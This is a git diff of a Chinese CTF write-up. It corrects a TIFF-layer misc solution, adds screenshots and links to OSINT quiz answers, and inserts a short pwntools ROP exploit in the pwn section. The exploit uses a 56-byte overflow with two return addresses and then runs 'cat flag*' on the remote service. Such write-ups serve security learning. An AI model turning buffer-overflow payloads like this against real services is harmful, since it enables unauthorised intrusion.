@@ -123,8 +123,11 @@ none
 现在 AI 这么发达，应该能够找它帮忙去除可恶的春赛克吧！嗯！
 :::
 ### 解题思路:
-我们不难知道HIFF是一个可以保存多图层信息的文件\
-直接在搜索引擎上寻找HIFF分离工具即可得到flag
+我们得到一个```.tif```格式的文件,这是一个TIFF文件\
+我们不难知道TIFF是一个可以保存多图层信息的文件\
+直接在搜索引擎上寻找TIFF分离工具即可得到flag\
+例如 http://www.zuohaotu.com/tiff-split.aspx \
+我们分离得到关键图层 ![](mosaic.png)
 
 ## [Easy] 知识问答
 :::note[描述]
@@ -151,10 +154,15 @@ rk 国庆出去玩了，来盒一下 rk 去了哪吧～
 ### 解题思路:
 第一题,作为沙卵二次元又是赛车车迷,一眼GSR车队的Racing Miku\
 通过Racing Miku不难查到活动时间\
+![](racing%20miku.png)
 第二题,仅需搜索高达立像即可知道是啦啦宝都\
-不难查到开业时间和运营公司\
+不难查到立像揭幕时间和运营公司\
+![](ganda.png)
+![](llbd1.png)
+![](llbd2.png)
 第三题,仅需搜索```苏州 商场 流光```\
-即可在苏州本地的商圈推荐网站上找到圆融时代广场\
+即可在[苏州的商圈推荐网站](https://cn.tripadvisor.com/Attractions-g297442-Activities-c26-t143-Suzhou_Jiangsu.html)上找到圆融时代广场\
+![](suzhou.png)
 我们的flag就出来了
 
 ## [Normal]广工问答
@@ -163,9 +171,13 @@ rk 国庆出去玩了，来盒一下 rk 去了哪吧～
 :::
 ### 解题思路:
 第一题直接搜索```广东工业大学网络安全技能大赛```即可找到公告\
+![](CTF1.png)
 第二题进入校园门户网站在公告搜索```谈判比选```即可找到成交时间\
+![](bike.png)
 第三题直接搜索```广东工业大学图书馆书目检索系统```进入网站,拉到底部即可\
+![](library.png)
 第四题直接搜索```广东工业大学 全运会```即可\
+![](gdut.png)
 很快得到了flag
 
 ## [Normal]我们一起回去好不好
@@ -197,7 +209,21 @@ pwn 都很简单都来做 pwn
 ### 解题思路:
 直接丢给AI即可\
 对话过长,暂不展示
-
+```python
+# 使用Python发送payload并获取flag
+python3 -c "
+from pwn import *
+r = remote('地址', 端口)
+r.recvuntil(b'Build your chain:')
+payload = b'A'*56 + b'\x96\x11\x40\x00\x00\x00\x00\x00' + b'\xf2\x11\x40\x00\x00\x00\x00\x00'
+r.sendline(payload)
+r.recvuntil(b'Decryption routine activated')
+r.sendline(b'cat flag*')
+print(r.recvall(timeout=2).decode())
+r.close()
+"
+```
+![](pwn.png)
 # reverse
 
 ## [Easy]签到
@@ -206,9 +232,12 @@ pwn 都很简单都来做 pwn
 :::
 ### 解题思路:
 老老实实在多平台跑一遍即可\
-Windows\
-WSL\
-MacOS
+Windows
+![](flag1.png)
+WSL
+![](flag2.png)
+
+PS:之前在MacOS上也能跑出第二段的,现在不知道为什么复现不出来了(悲)
 
 # web
 
